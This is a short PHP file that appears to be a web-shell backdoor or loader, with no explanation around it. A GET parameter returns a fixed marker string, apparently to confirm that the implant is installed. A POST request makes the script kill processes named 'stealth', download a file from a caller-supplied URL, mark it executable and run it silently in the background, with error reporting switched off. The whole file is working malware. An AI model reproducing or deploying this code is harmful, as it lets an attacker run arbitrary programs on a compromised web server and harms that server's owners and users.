<?php

error_reporting(0);

if ($_GET["cg"] == "chk")
{
	echo "aux6TheioGhueQu3";
	die;
}

if ($_POST["cp"] == "download")
{
	$fname = substr(str_shuffle(str_repeat($x = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", ceil(6 / strlen($x)))) , 1, 6);
	$url = $_POST["url"];
	if (!empty($url))
	{
		@unlink($fname);
		exec("pkill -9 -f stealth");
		exec("pkill -f -9 stealth");
		$c = file_get_contents(trim($url));
		file_put_contents($fname, $c);
		chmod($fname, 493);
		$command = "./{$fname} > /dev/null 2>/dev/null &";
		exec($command);
		echo "ok";
	}
}
